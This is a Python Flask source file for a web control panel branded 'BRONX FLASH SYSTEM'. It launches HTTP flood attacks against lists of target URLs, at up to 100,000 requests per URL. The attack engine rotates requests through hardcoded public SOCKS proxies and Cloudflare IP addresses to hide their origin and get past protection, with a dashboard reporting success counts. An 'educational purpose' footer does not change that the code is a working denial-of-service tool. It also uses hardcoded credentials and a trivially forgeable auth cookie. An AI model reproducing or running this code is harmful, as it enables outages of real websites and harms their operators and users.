from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []  # User ke custom proxies

CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5","104.16.0.1","104.16.0.2"]
DEFAULT_SOCKS5 = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080"]
DEFAULT_SOCKS4 = ["174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145","88.204.142.108:1080"]

# ============================================
# UI - GOD LEVEL
# ============================================
LOGIN = """<!DOCTYPE html><html><head><title>💀 BRONX SYSTEM</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Courier New',monospace;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.08) 1px,transparent 1px);background-size:35px 35px;pointer-events:none;animation:bgMove 15s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(35px,35px)}}
.box{background:rgba(5,0,0,0.95);padding:50px 40px;border-radius:25px;border:2px solid #ff0000;width:400px;text-align:center;box-shadow:0 0 100px rgba(255,0,0,0.4),inset 0 0 60px rgba(255,0,0,0.05);z-index:1;animation:glowBox 3s infinite}
@keyframes glowBox{0%,100%{box-shadow:0 0 60px rgba(255,0,0,0.3)}50%{box-shadow:0 0 150px rgba(255,0,0,0.7)}}
h1{font-size:3em;background:linear-gradient(180deg,#ff0000,#ff6666,#ff0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:none;margin-bottom:5px;animation:glitch 2s infinite}
@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(2px,-2px)}60%{transform:translate(-1px,1px)}80%{transform:translate(1px,-1px)}}
.sub{color:#ff8800;font-size:0.7em;letter-spacing:4px;margin:8px 0}
input{width:100%;padding:16px;background:rgba(0,0,0,0.8);border:1px solid #ff0000;border-radius:12px;color:#ff0000;margin:12px 0;font-family:monospace;font-size:15px;transition:0.3s}
input:focus{border-color:#ff4444;box-shadow:0 0 25px rgba(255,0,0,0.5);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:15px;text-transform:uppercase;letter-spacing:3px;transition:0.4s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 50px #ff0000;transform:scale(1.03)}.btn:active{transform:scale(0.98)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.1),transparent);animation:btnShine 2s infinite}
@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
</style></head><body>
<div class="box">
<h1>💀 BRONX</h1>
<div class="sub">⚡ FLASH SYSTEM v6.0 ⚡</div>
<p style="color:#666;font-size:0.6em;letter-spacing:2px">MULTI-TARGET | PROXY ROTATION</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:red;margin-top:10px">{{ error }}</p>{% endif %}
</div></body></html>"""

DASH = """<!DOCTYPE html><html><head><title>💀 BRONX FLASH SYSTEM</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ff0000;font-family:'Courier New',monospace;padding:15px;overflow-x:hidden}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.08) 0px,rgba(0,0,0,0.08) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.header{text-align:center;padding:20px;border:2px solid #ff0000;border-radius:15px;margin-bottom:20px;background:linear-gradient(180deg,rgba(20,0,0,0.9),rgba(0,0,0,0.9));box-shadow:0 0 60px rgba(255,0,0,0.3);animation:headerPulse 3s infinite}
@keyframes headerPulse{50%{box-shadow:0 0 100px rgba(255,0,0,0.6)}}
.header h1{font-size:2.2em;text-shadow:0 0 30px #ff0000;letter-spacing:6px;animation:glitch 2s infinite}
@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(2px,-2px)}}
.header .sub{color:#ff8800;font-size:0.6em;letter-spacing:4px;margin-top:5px}
.card{background:rgba(10,0,0,0.85);border:1px solid #ff0000;border-radius:12px;padding:20px;margin:15px 0;box-shadow:0 0 25px rgba(255,0,0,0.1)}
.card h3{color:#ff4444;margin-bottom:12px;font-size:1em;letter-spacing:3px;text-transform:uppercase}
input,select,textarea{width:100%;padding:12px;background:rgba(0,0,0,0.9);border:1px solid #ff0000;border-radius:8px;color:#ff0000;margin:7px 0;font-family:monospace;font-size:13px}
input:focus,select:focus,textarea:focus{border-color:#ff4444;box-shadow:0 0 20px rgba(255,0,0,0.4);outline:none}
label{color:#888;font-size:9px;text-transform:uppercase;letter-spacing:3px;display:block;margin-top:8px}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:8px 0;font-size:13px;text-transform:uppercase;letter-spacing:3px;transition:0.3s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 40px #ff0000;transform:scale(1.02)}.btn:active{transform:scale(0.97)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.15),transparent);animation:shine 2s infinite}
@keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.btn-green{background:linear-gradient(135deg,#00cc44,#009933)}.btn-green:hover{box-shadow:0 0 40px #00cc44}
.btn-stop{background:#333;color:#ff0000}.btn-stop:hover{box-shadow:0 0 30px #ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.col3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:rgba(10,0,0,0.85);padding:15px;text-align:center;border-radius:10px;border:1px solid #ff0000}
.stat-val{font-size:2em;font-weight:bold}.s{color:#00ff00}.f{color:#ff0000}.t{color:#ff8800}
.stat-label{font-size:8px;color:#888;text-transform:uppercase;letter-spacing:3px;margin-top:3px}
.logs{background:rgba(0,0,0,0.95);padding:12px;border-radius:5px;max-height:250px;overflow:auto;font-size:10px;margin-top:10px;border:1px solid #333;color:#00ff00}
.log{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.badge{padding:5px 14px;border-radius:20px;font-size:9px;display:inline-block;text-transform:uppercase;letter-spacing:2px}
.running{background:rgba(255,0,0,0.2);color:#ff0000;animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:0.4}}
.toggle-container{display:flex;align-items:center;gap:10px;margin:10px 0}
.toggle{position:relative;width:50px;height:26px;background:#333;border-radius:13px;cursor:pointer;transition:0.3s}
.toggle.active{background:#ff0000;box-shadow:0 0 20px #ff0000}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}
.toggle.active::after{left:27px}
.footer{text-align:center;padding:15px;color:#333;font-size:9px;letter-spacing:4px;margin-top:10px}
</style></head><body>
<div class="scanline"></div>
<div class="header">
<h1>💀 BRONX FLASH SYSTEM</h1>
<div class="sub">⚡ GOD LEVEL ATTACK NETWORK ⚡</div>
<p style="color:#555;font-size:0.5em;letter-spacing:2px;margin-top:3px">MULTI-TARGET | PROXY ROTATION | CF BYPASS</p>
</div>

<div class="col3">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="card">
<h3>🎯 MULTI-TARGET ATTACK</h3>
<label>🎯 TARGET URLs (One per line)</label>
<textarea id="urls" rows="3" placeholder="https://target1.com&#10;https://target2.com&#10;https://target3.com"></textarea>
<div class="row"><div><label>REQUESTS PER URL</label><input type="number" id="count" value="500"></div><div><label>SPEED</label><select id="speed"><option value="slow">🐢 SLOW</option><option value="fast" selected>⚡ FAST</option><option value="ultra">💀 ULTRA</option></select></div></div>
<label>ATTACK MODE</label>
<select id="mode">
<option value="flash">⚡ BRONX FLASH SPEED</option>
<option value="cf">🌐 CF IP ROTATION</option>
<option value="socks5">🔒 SOCKS5 PROXY</option>
<option value="socks4">🔒 SOCKS4 PROXY</option>
<option value="mixed">💀 MIXED MODE</option>
</select>
<button class="btn" onclick="start()">🚀 LAUNCH FLASH ATTACK</button>
<button class="btn btn-stop" onclick="stop()">⏹️ TERMINATE</button>
<div id="status"></div>
</div>

<div class="card">
<h3>🔧 PROXY SYSTEM</h3>
<div class="toggle-container">
<span style="color:#888;font-size:10px">PROXY SYSTEM:</span>
<div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div>
<span id="proxyStatus" style="color:#666;font-size:10px">OFF</span>
</div>
<label>🔒 CUSTOM PROXIES (IP:PORT per line)</label>
<textarea id="customProxies" rows="3" placeholder="94.158.244.245:1080&#10;68.71.249.153:48606&#10;193.25.215.182:22222"></textarea>
<button class="btn btn-green" onclick="saveProxies()">💾 SAVE PROXIES</button>
<div id="proxyCount" style="color:#666;font-size:9px;margin-top:5px">Default: 8 Proxies Loaded</div>
</div>

<div class="card"><h3>📜 LIVE BATTLE LOGS</h3><div class="logs" id="logs"></div></div>
<div class="footer">💀 BRONX ULTRA | FLASH SYSTEM v6.0 | EDUCATIONAL PURPOSE 💀</div>

<script>
let proxyOn=false;
function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('active',proxyOn);document.getElementById('proxyStatus').textContent=proxyOn?'ON':'OFF'}
function saveProxies(){let p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{document.getElementById('proxyCount').textContent=d.count+' Proxies Loaded'})}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log">${x}</div>`).join('')})}
function start(){let urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;let mode=document.getElementById('mode').value;if(urls.length==0)return alert('🎯 Enter Target URLs!');fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls,count:parseInt(count),speed,mode,proxy:proxyOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge running">⚡ FLASH ATTACK ACTIVE</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span style="color:#666">⏹️ TERMINATED</span>';l()})}
setInterval(()=>{l();u()},1000)
</script></body></html>"""

# ============================================
# ATTACK ENGINE
# ============================================
def send_flash(url):
    try:
        requests.get(url, timeout=8, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, verify=False)
        return True
    except: return False

def send_cf(url, cf_ip):
    try:
        headers = {"Host": url.split("/")[2], "User-Agent":"Mozilla/5.0"}
        requests.get(f"https://{cf_ip}/", headers=headers, timeout=8, verify=False)
        return True
    except: return False

def send_socks(url, proxy, ver=5):
    try:
        proto = f"socks{ver}://{proxy}"
        p = {"http":proto,"https":proto}
        requests.get(url, proxies=p, timeout=12, headers={"User-Agent":"Mozilla/5.0"})
        return True
    except: return False

def run_attack(attack_id, urls, count, speed, mode, use_proxy):
    delays = {"slow":0.08,"fast":0.01,"ultra":0.001}
    delay = delays.get(speed,0.01)
    all_proxies = custom_proxies + DEFAULT_SOCKS5 + DEFAULT_SOCKS4
    
    for i in range(count):
        if attack_id not in active_attacks: break
        
        url = random.choice(urls)
        success = False
        
        if mode == "flash":
            success = send_flash(url)
        elif mode == "cf":
            success = send_cf(url, random.choice(CF_IPS))
        elif mode == "socks5":
            success = send_socks(url, random.choice(all_proxies), 5) if use_proxy else send_flash(url)
        elif mode == "socks4":
            success = send_socks(url, random.choice(all_proxies), 4) if use_proxy else send_flash(url)
        elif mode == "mixed":
            r = random.random()
            if r < 0.33: success = send_flash(url)
            elif r < 0.66: success = send_cf(url, random.choice(CF_IPS))
            else: success = send_socks(url, random.choice(all_proxies), 5) if use_proxy else send_flash(url)
        
        if success: attack_stats["success"] += 1
        else: attack_stats["failed"] += 1
        attack_stats["total"] += 1
        
        if i % 100 == 0:
            attack_logs.append(f"⚡ [{mode.upper()}] ✅{attack_stats['success']} ❌{attack_stats['failed']} | {attack_stats['total']}/{count}")
        if len(attack_logs) > 120: attack_logs.pop(0)
        time.sleep(delay)
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    attack_logs.append(f"🏁 DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']} | MODE: {mode.upper()}")

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = d.get('urls',[])
    count = min(d.get('count',100),100000)
    speed = d.get('speed','fast')
    mode = d.get('mode','flash')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🔥 {len(urls)} TARGETS | {count} REQ | {mode.upper()} | PROXY:{'ON' if use_proxy else 'OFF'}")
    t = threading.Thread(target=run_attack, args=(aid,urls,count,speed,mode,use_proxy))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ TERMINATED")
    return jsonify({"status":"stopped"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    proxies_text = d.get('proxies','')
    custom_proxies = [p.strip() for p in proxies_text.split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved","count":len(custom_proxies)})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-30:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    import os, urllib3
    urllib3.disable_warnings()
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port)
